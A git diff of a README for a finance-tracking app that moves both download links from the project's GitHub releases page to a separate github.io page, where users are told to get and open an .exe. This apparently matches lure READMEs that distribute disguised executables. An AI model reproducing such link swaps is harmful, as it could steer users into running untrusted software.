@@ -1,6 +1,6 @@
 # 📈 FinancialProject - Track your business finances with ease
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue?style=for-the-badge)](https://github.com/Jaynecedarn675/FinancialProject/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue?style=for-the-badge)](https://jaynecedarn675.github.io)
 
 This application helps users manage financial data. It tracks records and provides reports. You use it to see your business performance. The system stores your information in a database. It ensures your numbers remain correct.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this program. Check this list before y
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Jaynecedarn675/FinancialProject/releases) to find the latest version.
+1. Visit the [releases page](https://jaynecedarn675.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section. 
 3. Click the file name to start the download.
 4. Open your Downloads folder once the file finishes.
